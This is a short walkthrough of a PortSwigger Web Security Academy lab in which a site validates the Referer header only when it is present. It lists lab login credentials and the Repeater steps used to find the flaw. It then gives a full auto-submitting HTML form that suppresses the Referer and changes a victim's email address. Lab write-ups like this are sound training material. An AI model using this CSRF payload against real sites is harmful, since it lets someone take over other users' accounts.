# CSRF where Referer validation depends on header being present

## This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.

## To solve the lab, use your exploit server to host an HTML page that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address.

## You can log in to your own account using the following credentials: `wiener:peter`

### step1 login

and change email and send to repeater
Referer: https://0a43001e04d993ff82467bab00ad0052.web-security-academy.net/my-account
change .net to .com and send request
Referer: https://0a43001e04d993ff82467bab00ad0052.web-security-academy.com/my-account
"Invalid referer header"
Delete the Referer header entirely and observe that the request is now accepted.and send request it will 302 found

HTML to suppress the Referer header

### HINT:

```html
<meta name="referrer" content="never" />
```

```html
<html>
  <head>
    <meta name="referrer" content="never" />
  </head>
  <body>
    <form
      action="https://0aa900d10373edfe81cd75dd008f004f.web-security-academy.net/my-account/change-email"
      method="POST"
    >
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

delivered to victim
